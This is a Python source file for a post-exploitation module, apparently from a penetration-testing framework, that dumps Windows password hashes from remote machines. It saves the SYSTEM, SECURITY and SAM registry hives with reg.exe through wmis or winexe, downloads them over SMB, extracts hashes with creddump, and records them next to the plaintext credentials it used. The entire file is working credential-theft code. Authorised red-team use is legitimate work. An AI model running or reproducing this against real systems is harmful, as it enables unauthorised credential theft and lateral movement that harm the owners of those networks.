"""

Dumps credentials using reg.exe copy and pulldown method.
Method inspired by smbexec :)


Module built by @harmj0y

"""

import time

import settings
from lib import command_methods
from lib import smb
from lib import helpers

# get our nifty hashdumping functionality
from lib import creddump

class Module:
    
    def __init__(self, targets=None, creds=None, args=None):
        
        self.name = "Hashdump"
        self.description = "Dump credentials using reg.exe backup method"

        # internal list() that holds one or more targets 
        self.targets = targets

        # internal list() that holds one or more cred tuples
        #   [ (username, pw), (username2, pw2), ...]
        self.creds = creds

        # a state output file that will be written out by pillage.py
        #   ex- if you're querying domain users
        self.output = ""

        #   user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {"trigger_method" : ["wmis", "[wmis] or [winexe] for triggering"]}
        
    def run(self):

        # assume single set of credentials for this module
        username, password = self.creds[0]

        triggerMethod = self.required_options["trigger_method"][0]

        # let's keep track of ALL hashes found
        allHashes = ""

        # reg.exe command to save off the hives
        regSaveCommand = "reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system /y && reg save HKLM\\SECURITY C:\\Windows\\Temp\\security /y && reg save HKLM\\SAM C:\\Windows\\Temp\\sam /y"

        for target in self.targets:
            
            print helpers.color("\n [*] Dumping hashes on " + target)

            # execute the registry save command
            command_methods.executeCommand(target, username, password, regSaveCommand, triggerMethod)

            # sleep for 5 seconds to let everything backup
            time.sleep(5)

            # grab all of the backed up files
            systemFile = smb.getFile(target, username, password, "C:\\Windows\\Temp\\system", delete=False)
            securityFile = smb.getFile(target, username, password, "C:\\Windows\\Temp\\security", delete=False)
            samFile = smb.getFile(target, username, password, "C:\\Windows\\Temp\\sam", delete=False)

            error = False
            if systemFile == "":
                self.output += "[!] File '"+systemFile+"' from "+target+" empty or doesn't exist\n"
                error = True
            else:
                f = open('/tmp/system', 'w')
                f.write(systemFile)
                f.close()

            if securityFile == "":
                self.output += "[!] File '"+securityFile+"' from "+target+" empty or doesn't exist\n"
            else:
                f = open('/tmp/security', 'w')
                f.write(securityFile)
                f.close()   

            if samFile == "":
                self.output += "[!] File '"+samFile+"' from "+target+" empty or doesn't exist\n"
                error = True
            else:
                f = open('/tmp/sam', 'w')
                f.write(samFile)
                f.close()

            if not error:
                # get all the hashes from these hives
                hashes = creddump.dump_file_hashes("/tmp/system", "/tmp/sam")

                # add the hashes to our global list
                allHashes += hashes

                # save off the file to PILLAGE_OUTPUT_PATH/hashdump/target/hashes.txt
                saveLocation = helpers.saveModuleFile(self, target, "hashes.txt", hashes)

                self.output += "[*] dumped hashes (reg.exe) using creds '"+username+":"+password+"' on "+target+" saved to "+saveLocation+"\n"

            else:
                self.output += "[!] Error executing hashdump using creds '"+username+":"+password+"'on "+target+"\n"

        if allHashes != "":
            # get all non-empty hashes, uniquify and sort them
            allHashes = [p.lower() for p in allHashes.split("\n") if p!='']
            allHashes = sorted(set(allHashes))
            self.output += "[*] All unique hashes:\n" + "\n".join(allHashes) + "\n"
